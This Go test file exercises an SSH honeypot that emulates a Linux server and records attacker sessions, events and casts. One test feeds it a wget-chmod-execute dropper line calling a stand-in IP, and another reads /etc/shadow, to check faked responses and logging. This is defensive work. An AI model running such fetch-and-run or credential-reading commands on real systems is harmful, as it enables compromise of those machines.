package honeypot

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/machine"
	"github.com/amirradjou/llm-honeypot/internal/profile"
	"github.com/amirradjou/llm-honeypot/internal/recorder"
	"github.com/amirradjou/llm-honeypot/internal/sshd"

	"golang.org/x/crypto/ssh"
)

func startHoneypot(t *testing.T) (addr, dataDir string) {
	t.Helper()
	dataDir = t.TempDir()
	m, err := machine.New(profile.Default(), time.Now)
	if err != nil {
		t.Fatal(err)
	}
	rec := recorder.New(dataDir)
	h := New(m, rec, slog.New(slog.NewTextHandler(io.Discard, nil)))

	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	signer, _ := ssh.NewSignerFromKey(priv)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := sshd.New(sshd.Config{AuthDelay: time.Millisecond}, signer, h, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ctx, cancel := context.WithCancel(context.Background())
	go func() { _ = srv.Serve(ctx, ln) }()
	t.Cleanup(cancel)
	return ln.Addr().String(), dataDir
}

func dialHoneypot(t *testing.T, addr, user, pass string) *ssh.Client {
	t.Helper()
	c, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	})
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

func exec(t *testing.T, c *ssh.Client, cmd string) string {
	t.Helper()
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer sess.Close()
	out, _ := sess.CombinedOutput(cmd)
	return string(out)
}

func TestEndToEndExecAndRecording(t *testing.T) {
	addr, dataDir := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "admin123")

	if out := exec(t, c, "uname -a"); !strings.HasPrefix(out, "Linux srv-web01") {
		t.Errorf("uname -a = %q", out)
	}
	if out := exec(t, c, "whoami"); out != "root\n" {
		t.Errorf("whoami = %q", out)
	}
	drop := exec(t, c, "cd /tmp; wget http://198.51.100.23/x.sh -O m.sh; chmod +x m.sh; ./m.sh; ls m.sh")
	if !strings.Contains(drop, "200 OK") || !strings.Contains(drop, "Exec format error") || !strings.Contains(drop, "m.sh") {
		t.Errorf("dropper = %q", drop)
	}
	_ = c.Close()

	// Wait until the recording is complete: Disconnected flushes the final
	// events asynchronously after the client goes away.
	deadline := time.Now().Add(5 * time.Second)
	var types []string
	var sawDownload, sawAuthAccepted bool
	for time.Now().Before(deadline) {
		files := jsonlFiles(t, dataDir)
		if len(files) == 0 {
			time.Sleep(20 * time.Millisecond)
			continue
		}
		types = types[:0]
		sawDownload, sawAuthAccepted = false, false
		for _, line := range readLines(t, files[0]) {
			var e recorder.Event
			if err := json.Unmarshal([]byte(line), &e); err != nil {
				continue
			}
			types = append(types, string(e.Type))
			if e.Type == recorder.EventDownload && strings.Contains(e.URL, "198.51.100.23") {
				sawDownload = true
			}
			if e.Type == recorder.EventAuth && e.Accepted != nil && *e.Accepted {
				sawAuthAccepted = true
			}
		}
		if contains(types, "disconnect") {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	if len(types) == 0 {
		t.Fatal("no recordings written")
	}
	if !sawAuthAccepted {
		t.Error("no accepted auth recorded")
	}
	if !sawDownload {
		t.Error("download not recorded")
	}
	if !contains(types, "connect") || !contains(types, "disconnect") || !contains(types, "command") {
		t.Errorf("event types = %v", types)
	}
}

func TestEndToEndPrivilegeSeparation(t *testing.T) {
	addr, _ := startHoneypot(t)
	// A non-root login cannot read shadow but can via sudo.
	c := dialHoneypot(t, addr, "martin", "hunter2")
	if out := exec(t, c, "cat /etc/shadow"); !strings.Contains(out, "Permission denied") {
		t.Errorf("martin cat shadow = %q", out)
	}
	if out := exec(t, c, "id"); !strings.Contains(out, "uid=1001(martin)") {
		t.Errorf("martin id = %q", out)
	}
	if out := exec(t, c, "sudo head -1 /etc/shadow"); !strings.Contains(out, "root:$6$") {
		t.Errorf("martin sudo = %q", out)
	}
}

func jsonlFiles(t *testing.T, dir string) []string {
	t.Helper()
	var out []string
	_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
		if err == nil && strings.HasSuffix(p, ".jsonl") {
			out = append(out, p)
		}
		return nil
	})
	return out
}

func readLines(t *testing.T, path string) []string {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return strings.Split(strings.TrimRight(string(data), "\n"), "\n")
}

func contains(ss []string, v string) bool {
	for _, s := range ss {
		if s == v {
			return true
		}
	}
	return false
}

// A real sshd keeps a command's stderr on the channel's extended-data
// stream; `ssh host cmd 2>/dev/null` relies on it.
func TestExecKeepsStderrApart(t *testing.T) {
	addr, _ := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "x")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer sess.Close()
	var stdout, stderr strings.Builder
	sess.Stdout, sess.Stderr = &stdout, &stderr
	err = sess.Run("echo out; ls /nonexistent")
	var ee *ssh.ExitError
	if !errors.As(err, &ee) || ee.ExitStatus() != 2 {
		t.Errorf("exit = %v", err)
	}
	if stdout.String() != "out\n" || !strings.Contains(stderr.String(), "No such file or directory") {
		t.Errorf("stdout %q, stderr %q", stdout.String(), stderr.String())
	}
}

// An interactive session leaves an asciinema recording of what the
// attacker saw.
func TestInteractiveSessionIsRecordedAsCast(t *testing.T) {
	addr, dataDir := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "x")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.RequestPty("xterm-256color", 30, 100, ssh.TerminalModes{}); err != nil {
		t.Fatal(err)
	}
	stdin, _ := sess.StdinPipe()
	var out strings.Builder
	sess.Stdout = &out
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	io.WriteString(stdin, "uname -n\r")
	io.WriteString(stdin, "exit\r")
	_ = sess.Wait()

	var casts []string
	deadline := time.Now().Add(3 * time.Second)
	for len(casts) == 0 && time.Now().Before(deadline) {
		casts, _ = filepath.Glob(filepath.Join(dataDir, "sessions", "*", "*.cast"))
		time.Sleep(20 * time.Millisecond)
	}
	if len(casts) != 1 {
		t.Fatalf("casts = %v", casts)
	}
	data, _ := os.ReadFile(casts[0])
	text := string(data)
	if !strings.Contains(text, `"width":100`) || !strings.Contains(text, "srv-web01") || !strings.Contains(text, "logout") {
		t.Errorf("cast = %s", text)
	}
}

// An interactive login shell says -bash, and an unfinished line continues
// at bash's "> " prompt instead of failing with a syntax error.
func TestInteractiveShellLooksLikeALoginShell(t *testing.T) {
	addr, _ := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "x")
	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.RequestPty("xterm", 24, 100, ssh.TerminalModes{}); err != nil {
		t.Fatal(err)
	}
	stdin, _ := sess.StdinPipe()
	var out strings.Builder
	sess.Stdout = &out
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	io.WriteString(stdin, "echo $0\r")
	io.WriteString(stdin, "for i in 1 2; do\r")
	io.WriteString(stdin, "echo item$i; done\r")
	io.WriteString(stdin, "nosuchcmd\r")
	io.WriteString(stdin, "exit\r")
	_ = sess.Wait()
	text := out.String()
	for _, want := range []string{"-bash\r\n", "> ", "item1\r\nitem2", "-bash: nosuchcmd: command not found"} {
		if !strings.Contains(text, want) {
			t.Errorf("missing %q in:\n%s", want, text)
		}
	}
}

// The box keeps its own clock and sshd's environment format; the host's
// timezone and an "ip:port" in SSH_CLIENT were both giveaways.
func TestSessionEnvironmentAndBannerLookReal(t *testing.T) {
	addr, _ := startHoneypot(t)
	c := dialHoneypot(t, addr, "root", "x")
	if out := exec(t, c, "echo $SSH_CLIENT"); !regexp.MustCompile(`^127\.0\.0\.1 \d+ 22\n$`).MatchString(out) {
		t.Errorf("SSH_CLIENT = %q", out)
	}
	if out := exec(t, c, "date +%Z"); out != "UTC\n" {
		t.Errorf("date +%%Z = %q (the profile's timezone is Etc/UTC)", out)
	}

	sess, err := c.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	if err := sess.RequestPty("xterm", 24, 100, ssh.TerminalModes{}); err != nil {
		t.Fatal(err)
	}
	stdin, _ := sess.StdinPipe()
	var out strings.Builder
	sess.Stdout = &out
	if err := sess.Shell(); err != nil {
		t.Fatal(err)
	}
	io.WriteString(stdin, "exit\r")
	_ = sess.Wait()
	banner := out.String()
	if !regexp.MustCompile(`System information as of \w{3} \w{3} [ \d]\d \d\d:\d\d:\d\d UTC \d{4}\r\n`).MatchString(banner) {
		t.Errorf("sysinfo line wrong:\n%s", banner)
	}
	if strings.Contains(banner, "\r\r\n") {
		t.Errorf("banner has doubled carriage returns")
	}
	if !regexp.MustCompile(`Last login: .* from 10\.20\.30\.15\r\n`).MatchString(banner) {
		t.Errorf("last login wrong:\n%s", banner)
	}
}

// A command that finishes at once must still reach the client with its
// exit status: the exec request is answered before the command starts.
func TestInstantExecNeverEndsInEOF(t *testing.T) {
	addr, _ := startHoneypot(t)
	var wg sync.WaitGroup
	errs := make(chan error, 1500)
	sem := make(chan struct{}, 40) // stay under the server's MaxConns
	for i := 0; i < 1500; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			c, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
				User: "root", Auth: []ssh.AuthMethod{ssh.Password("x")},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: 10 * time.Second,
			})
			if err != nil {
				errs <- err
				return
			}
			defer c.Close()
			s, err := c.NewSession()
			if err != nil {
				errs <- err
				return
			}
			defer s.Close()
			if out, err := s.Output("true"); err != nil || len(out) != 0 {
				errs <- fmt.Errorf("true = %q, %v", out, err)
			}
		}()
	}
	wg.Wait()
	close(errs)
	n := 0
	for err := range errs {
		if n < 3 {
			t.Error(err)
		}
		n++
	}
	if n > 0 {
		t.Errorf("%d of 1500 sessions failed", n)
	}
}
